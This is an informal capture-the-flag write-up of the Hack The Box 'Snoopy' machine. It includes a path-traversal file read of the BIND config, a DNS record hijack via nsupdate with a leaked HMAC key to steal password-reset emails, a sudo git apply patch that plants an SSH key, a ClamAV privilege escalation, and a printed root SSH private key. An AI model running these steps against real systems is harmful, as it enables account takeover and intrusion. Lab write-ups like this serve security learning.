## Snoopy


```
Nmap scan report for snoopy.htb (10.129.85.155)
Host is up (0.056s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
53/tcp    open     domain    ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp    open     http      nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
1103/tcp  filtered xaudio
4678/tcp  filtered traversal
43668/tcp filtered unknown
46816/tcp filtered unknown
52961/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Snoppy scan reveals only 22 53 80 as open ports



in the bootstrap website there's an interesting hidden function whichi is GET /download that point on a .zip archive


in the .zip are present a pdf 



Charles Schultz CEO


cschultz@snoopy.htb

sbrown@snoopy.htb  (video!)


hangel@snoopy.htb
lpelt@snoopy.htb

pr@snoopy.htb





found a subdomain with mattermost service

http://mm.snoopy.htb




## Arbitrary File Read trought zip download


in snoopy.htb there's a download?file=announcement.pdf 

```http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//etc/bind/named.conf
```



as we can see [here](https://bind9.readthedocs.io/en/v9.18.14/reference.html) we can find the secret of dns server for update 



so we can try point mail.snoopy.htb to our address in order to recieve email reset_token!



we can do it with nsupdate




```
export HMAC='hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA='

nsupdate -y $HMAC

> server 10.10.11.212
> update add mail.snoopy.htb. 900 IN A 10.10.14.233
> show
> send

```

now in mm.snoopy.htb/reset_password 


reset password for one employee.. tried with sbrown and cbrown





## SSH_MITM

In mattermost we can select an interesting function /server_provision 

and select LINUX 2222/tcp


found this creds cbrown : sn00pedcr3dential!!!



`ssh cbrown@snoopy.htb`



## Privesc


sudo -l reveals


```
[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git apply *
```



so we can try add things in sbrown directory ... and the only nice thing is to trying write my ssh pubkey in `/home/sbrown/.ssh/authorized_keys`

#### .patch
```
diff --git a/cbrown/.bash_history b/cbrown/.bash_history
deleted file mode 120000
index dc1dc0c..0000000
--- a/cbrown/.bash_history
+++ /dev/null
@@ -1 +0,0 @@
-/dev/null
\ No newline at end of file
diff --git a/sbrown/.ssh/authorized_keys b/sbrown/.ssh/authorized_keys
new file mode 100644
index 0000000..e69de29
--- /dev/null
+++ b/sbrown/.ssh/authorized_keys
@@ -0,0 +1 @@
+ssh-rsa AAAAAAAAAAAAAAAzaC1..................MOHycJSTWM/pHlUsG...cDfhYojnjivCpzicSpLq
```


## User flag
so ssh sbrown@snoopy.htb







## ROOT



sudo -l shows clamscan 

Found this on [google](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/)
and also this [exploit](https://raw.githubusercontent.com/josemlwdf/ClamAV_Privilege_Escalation/main/root_exploit.py) on github 


##### extracted ssh root id_rsa


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


```
chmod 600 id_rsa 
ssh -i id_rsa root@snoopy.htb
```










